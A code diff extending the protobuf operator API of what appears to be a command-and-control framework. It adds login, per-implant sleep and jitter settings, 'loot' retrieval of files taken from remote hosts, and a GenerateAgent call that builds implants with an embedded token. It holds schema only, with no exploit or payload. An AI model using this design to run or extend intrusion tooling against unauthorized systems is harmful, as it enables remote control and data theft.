@@ -7,18 +7,49 @@ option go_package = "github.com/digitizables/lattice/gen/lattice/operator/v1;ope
 import "google/protobuf/timestamp.proto";
 
 service OperatorService {
+  rpc Login(LoginRequest) returns (LoginResponse);
+  rpc Logout(LogoutRequest) returns (LogoutResponse);
+
   rpc ListSessions(ListSessionsRequest) returns (ListSessionsResponse);
   rpc DeleteSession(DeleteSessionRequest) returns (DeleteSessionResponse);
+  rpc SetSessionNote(SetSessionNoteRequest) returns (SetSessionNoteResponse);
+  rpc SetAgentSleep(SetAgentSleepRequest) returns (SetAgentSleepResponse);
+
   rpc GetTask(GetTaskRequest) returns (GetTaskResponse);
   rpc SubmitTask(SubmitTaskRequest) returns (SubmitTaskResponse);
   rpc CancelTask(CancelTaskRequest) returns (CancelTaskResponse);
+
   rpc ListListeners(ListListenersRequest) returns (ListListenersResponse);
   rpc ReloadExtensions(ReloadExtensionsRequest) returns (ReloadExtensionsResponse);
+
   rpc ListAgentUpdates(ListAgentUpdatesRequest) returns (ListAgentUpdatesResponse);
   rpc PublishAgentUpdate(PublishAgentUpdateRequest) returns (PublishAgentUpdateResponse);
   rpc ListElevateModules(ListElevateModulesRequest) returns (ListElevateModulesResponse);
+
+  rpc ListLoot(ListLootRequest) returns (ListLootResponse);
+  rpc GetLoot(GetLootRequest) returns (GetLootResponse);
+  rpc DeleteLoot(DeleteLootRequest) returns (DeleteLootResponse);
+
+  rpc GenerateAgent(GenerateAgentRequest) returns (GenerateAgentResponse);
+
   rpc StreamEvents(StreamEventsRequest) returns (stream StreamEventsResponse);
 }
+
+message LoginRequest {
+  string username = 1;
+  string password = 2;
+}
+
+message LoginResponse {
+  string access_token = 1;
+  string username = 2;
+  // Seconds until expiry from issue time (sliding refresh may extend server-side).
+  int64 expires_in_seconds = 3;
+}
+
+message LogoutRequest {}
+
+message LogoutResponse {}
 
 message ListSessionsRequest {
   // Max rows to return. Server clamps to [1, 200]; default 50.
@@ -44,6 +75,25 @@ message DeleteSessionRequest {
 
 message DeleteSessionResponse {}
 
+message SetSessionNoteRequest {
+  string agent_id = 1;
+  string note = 2;
+}
+
+message SetSessionNoteResponse {
+  Session session = 1;
+}
+
+message SetAgentSleepRequest {
+  string agent_id = 1;
+  uint64 sleep_seconds = 2;
+  uint32 jitter_percent = 3; // 0-100
+}
+
+message SetAgentSleepResponse {
+  Session session = 1;
+}
+
 message Session {
   string agent_id = 1;
   string hostname = 2;
@@ -52,6 +102,15 @@ message Session {
   string arch = 5;
   google.protobuf.Timestamp last_seen = 6;
   string cwd = 7;
+  string note = 8;
+  uint64 sleep_seconds = 9;
+  uint32 jitter_percent = 10;
+  repeated string features = 11;
+  repeated string ops = 12;
+  // Desired sleep from SetAgentSleep; applied on next check-in when set.
+  uint64 desired_sleep_seconds = 13;
+  uint32 desired_jitter_percent = 14;
+  bool has_desired_sleep = 15;
 }
 
 message SubmitTaskRequest {
@@ -143,6 +202,68 @@ message ElevateModule {
   string description = 7;
   repeated string default_args = 8;
   google.protobuf.Timestamp published_at = 9;
+}
+
+message ListLootRequest {
+  string agent_id = 1; // empty = all
+  int32 page_size = 2;
+  string page_token = 3;
+}
+
+message ListLootResponse {
+  repeated LootItem items = 1;
+  string next_page_token = 2;
+  int32 total_count = 3;
+}
+
+message LootItem {
+  string loot_id = 1;
+  string agent_id = 2;
+  string name = 3;
+  string remote_path = 4;
+  string content_type = 5;
+  uint64 size = 6;
+  string sha256 = 7;
+  string task_id = 8;
+  google.protobuf.Timestamp created_at = 9;
+}
+
+message GetLootRequest {
+  string loot_id = 1;
+  // When true, include file bytes (may be large).
+  bool include_data = 2;
+}
+
+message GetLootResponse {
+  LootItem item = 1;
+  bytes data = 2;
+}
+
+message DeleteLootRequest {
+  string loot_id = 1;
+}
+
+message DeleteLootResponse {}
+
+message GenerateAgentRequest {
+  string server_url = 1; // e.g. https://host:8443
+  string os = 2;         // windows | linux | darwin
+  string arch = 3;       // amd64 | arm64
+  uint64 sleep_seconds = 4;
+  uint32 jitter_percent = 5;
+  bool insecure_tls = 6;
+  // When true, embed LATTICE_AGENT_TOKEN from the teamserver config into the build.
+  bool embed_agent_token = 7;
+  string output_name = 8; // optional filename hint
+}
+
+message GenerateAgentResponse {
+  string path = 1; // server-side path under data/generated
+  string os = 2;
+  string arch = 3;
+  uint64 size = 4;
+  string sha256 = 5;
+  bytes data = 6; // binary (same Connect size caveats as PublishAgentUpdate)
 }
 
 message StreamEventsRequest {
